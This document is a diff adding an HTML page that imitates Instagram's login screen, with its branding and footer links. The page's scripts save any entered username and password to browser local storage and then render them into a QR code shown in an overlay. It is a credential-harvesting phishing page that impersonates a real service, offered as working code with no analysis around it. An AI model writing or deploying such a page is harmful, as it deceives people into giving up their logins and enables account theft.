@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            margin-top: 60px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 40px 20px;
+            margin: 0 0 10px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            font-size: 38px;
+            font-family: 'Instagram Sans', Instagram Sans;
+            font-weight: 400;
+        }
+
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            font-size: 12px;
+        }
+
+        button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px;
+            margin: 15px 0;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .separator {
+            color: #8e8e8e;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .fb-login {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0;
+            display: block;
+        }
+
+        .forgot-pw {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .signup {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 25px;
+            margin: 0 0 10px;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .get-app {
+            padding: 20px;
+        }
+
+        .app-stores {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .footer {
+            color: #8e8e8e;
+            text-align: center;
+            margin: 40px 0;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+  /* Overlay Styles */
+        .overlay {
+            position: fixed;
+            display: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        .overlay-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            width: 70%;
+            max-width: 600px;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            right: 20px;
+            top: 10px;
+            font-size: 28px;
+            cursor: pointer;
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            <form id="loginForm">
+                <input type="text"id="username" name="username" placeholder="Phone number, username or email" required>
+                <input type="password" id="password" name="password"  placeholder="Password" required>
+                <button type="submit" onclick="generateQRCode()" >Log in</button>
+            </form>
+
+            <div class="separator">OR</div>
+
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot-pw">Forgotten your password?</a>
+        </div>
+
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+<div id="myOverlay" class="overlay">
+        <div class="overlay-content">
+            <span class="close-btn" onclick="closeOverlay()">&times;</span>
+            <h2>Qr code</h2>
+            <div id="qrcode"></div>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <span>Google Play</span>
+                <span>Microsoft</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Cookie settings</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact uploading and non-users</a>
+            </div>
+            <div style="margin-top: 20px;">
+                <select style="border: none; color: #8e8e8e; font-size: 12px;">
+                    <option>English</option>
+                </select>
+                <div style="margin-top: 10px;">© 2024 Instagram from Meta</div>
+            </div>
+        </div>
+    </div>
+
+<script defer>
+        // The script now runs after the form element is loaded.
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value; // Get the value from the username field
+            var password = document.getElementById('password').value; // Get the value from the password field
+            localStorage.setItem('username', username); // Store the username in local storage
+            localStorage.setItem('password', password); // Store the password in local storage
+        });
+    </script>
+
+<script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('myOverlay').style.display = 'block';
+        });
+
+        function closeOverlay() {
+            document.getElementById('myOverlay').style.display = 'none';
+        }
+    </script>
+
+ <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
+    <script>
+      function generateQRCode() {
+        var username = localStorage.getItem('username');
+        var password = localStorage.getItem('password');
+        var data = `Username: ${username}\nPassword: ${password}`;
+
+        var qrcode = new QRCode(document.getElementById("qrcode"), {
+          text: data,
+          width: 128,
+          height: 128,
+          colorDark : "#000000",
+          colorLight : "#ffffff",
+          correctLevel : QRCode.CorrectLevel.H
+        });
+      }
+    </script>
+
+
+
+</body>
+</html>
